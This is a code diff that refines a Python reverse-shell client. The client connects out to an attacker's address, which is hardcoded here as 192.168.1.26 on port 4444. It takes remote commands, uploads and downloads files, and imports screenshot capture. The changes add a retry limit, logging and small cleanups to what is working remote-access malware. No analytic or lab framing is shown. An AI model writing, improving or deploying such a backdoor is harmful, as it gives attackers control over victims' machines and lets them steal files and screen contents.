@@ -5,12 +5,18 @@ from time import sleep
 from pyautogui import screenshot
 
 def reverse_shell(attacker_ip, attacker_port):
+    max_retries = 15
+    retry_count = 0
 
-
-    while True:
+    while retry_count < max_retries:
         try:
+            print(f"[INFO] Attempting to connect... (Attempt {retry_count + 1}/{max_retries})")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((attacker_ip, attacker_port))
+            print("[INFO] Connected to the attacker.")
+            
+            retry_count = 0  # Reset retries after connecting successfully
+
             while True:
                 command = s.recv(1024)
                 command = command.decode()
@@ -21,11 +27,11 @@ def reverse_shell(attacker_ip, attacker_port):
                     s.close()
                     return
                 elif command.startswith("upload"):
-                    x, filename = command.split(' ', 1)
+                    _, filename = command.split(' ', 1)
                     filename = filename.strip()
                     upload_file(s, filename)
                 elif command.startswith("download"):
-                    x, filename = command.split(' ', 1)
+                    _, filename = command.split(' ', 1)
                     filename = filename.strip()
                     print(filename)
                     download_file(s, filename)
@@ -39,7 +45,12 @@ def reverse_shell(attacker_ip, attacker_port):
         except (socket.error, BrokenPipeError) as e:
             print(f"[ERROR] Connection lost: {e}. Retrying in 10 seconds.")
             s.close()
-            sleep(10)
+            retry_count += 1
+            if retry_count < max_retries:
+                sleep(10)
+            else:
+                break
+
 
 
 def upload_file(conn, filename):
@@ -112,4 +123,4 @@ def run(functions):
 
 
 if __name__ == "__main__":
-    reverse_shell()
+    reverse_shell("192.168.1.26", 4444)
